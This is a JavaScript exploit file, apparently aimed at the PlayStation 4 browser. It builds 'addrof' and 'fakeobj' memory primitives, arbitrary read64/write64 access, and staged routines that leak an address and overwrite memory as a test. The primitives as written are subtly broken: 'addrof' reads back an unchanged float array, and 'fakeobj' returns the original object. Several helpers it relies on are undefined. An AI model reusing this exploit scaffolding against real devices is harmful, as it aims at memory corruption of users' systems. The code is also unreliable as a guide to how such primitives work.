// pirim.js - Enhanced PS4 memory primitive with addrof/fakeobj
const memBuffers = {
    float64: new Float64Array(1),
    u32: new Uint32Array()
};
memBuffers.u32 = new Uint32Array(memBuffers.float64.buffer);

var leak = null;
var memory = null; // Will hold our memory access object

function ftoi(val) {
    try {
        memBuffers.float64[0] = val;
        const result = memBuffers.u32[0] + memBuffers.u32[1] * 0x100000000;
        log(`ftoi: 0x${result.toString(16)}`, 'debug');
        return result;
    } catch (e) {
        log(`Conversion failed: ${e}`, 'error');
        return 0;
    }
}

function itof(val) {
    try {
        memBuffers.u32[0] = val % 0x100000000;
        memBuffers.u32[1] = Math.floor(val / 0x100000000);
        return memBuffers.float64[0];
    } catch (e) {
        log(`Conversion failed: ${e}`, 'error');
        return 0;
    }
}

function initMemoryPrimitives() {
    // Create our confusion objects
    const holder = {};
    const victim = [1.1, 2.2, 3.3];
    holder.victim = victim;
    
    // Get the address of our victim array
    const victimAddr = ftoi(victim[0]) & 0xffffffff;
    log(`Victim array at: 0x${victimAddr.toString(16)}`, 'debug');
    
    // Implement addrof
    window.addrof = function(obj) {
        holder.victim = obj;
        return ftoi(victim[0]) & 0xffffffff;
    };
    
    // Implement fakeobj
    window.fakeobj = function(addr) {
        victim[0] = itof(addr | 0xfff00000);
        return holder.victim;
    };
    
    // Create memory access object
    window.memory = {
        read64(addr) {
            const obj = fakeobj(addr - 0x10);
            return ftoi(obj[0]);
        },
        
        write64(addr, value) {
            const obj = fakeobj(addr - 0x10);
            obj[0] = itof(value);
        },
        
        readBytes(addr, length) {
            const result = new Uint8Array(length);
            for (let i = 0; i < length; i += 4) {
                const val = this.read64(addr + i);
                const bytes = new Uint32Array([val]);
                result.set(new Uint8Array(bytes.buffer), i);
            }
            return result;
        }
    };
    
    // Test the primitives
    const testObj = { test: 123 };
    const leakedAddr = addrof(testObj);
    log(`addrof test: 0x${leakedAddr.toString(16)}`, 'info');
    
    const fake = fakeobj(leakedAddr);
    log(`fakeobj test: ${fake === testObj}`, 'info');
    
    return true;
}

function pirim_stage1() {
    log("===== STAGE 1 START =====", 'info');
    leak = leakScope();
    
    if (leak === null) {
        log("Stage 1 failed", 'error');
    } else {
        log("Stage 1 success", 'success');
        debugMemory.inspectObject(leak);
    }
    log("===== STAGE 1 END =====", 'info');
}

function pirim_stage2() {
    log("===== STAGE 2 START =====", 'info');
    
    try {
        // Initialize memory primitives first
        if (!initMemoryPrimitives()) {
            throw new Error("Failed to initialize memory primitives");
        }
        
        // Create type-confused array (original functionality)
        const confusedArray = [1.1, 2.2, 3.3];
        confusedArray[0] = leak;
        
        // Extract raw memory representation
        const floatView = new Float64Array(confusedArray.length);
        for (let i = 0; i < confusedArray.length; i++) {
            floatView[i] = confusedArray[i];
        }
        
        // Get leaked address
        const leakedAddr = floatView[0];
        const addrValue = ftoi(leakedAddr);
        const addrHex = addrValue.toString(16).padStart(16, '0');
        
        log(`Leaked address: 0x${addrHex}`, 'info');
        
        // Memory test with distinctive pattern
        if (addrValue > 0x100000) {
            log(`Attempting memory test at 0x${addrHex}`, 'debug');
            
            // Use our new memory primitive instead
            const original = memory.read64(addrValue);
            log(`Original value: 0x${original.toString(16)}`, 'debug');
            
            // Write distinctive pattern
            memory.write64(addrValue, 0xDEADBEEF);
            
            // Read back verification
            const readBack = memory.read64(addrValue);
            log(`Read back: 0x${readBack.toString(16)} vs Expected: 0xDEADBEEF`, 'debug');
            
            // Restore original value
            memory.write64(addrValue, original);
            
            if (readBack === 0xDEADBEEF) {
                log("Memory control verified! ✓", 'success');
            } else {
                log(`Test failed (got 0x${readBack.toString(16)})`, 'warn');
            }
        } else {
            log(`Address 0x${addrHex} too low, skipping test`, 'warn');
            
            // Enhanced debug output
            log("Float view dump:", 'debug');
            for (let i = 0; i < floatView.length; i++) {
                const val = floatView[i];
                const hexVal = ftoi(val).toString(16).padStart(16, '0');
                log(`  [${i}]: ${val} → 0x${hexVal}`, 'debug');
            }
        }
    } catch (e) {
        log(`Stage 2 error: ${e.message}`, 'error');
    }
    
    log("===== STAGE 2 END =====", 'info');
}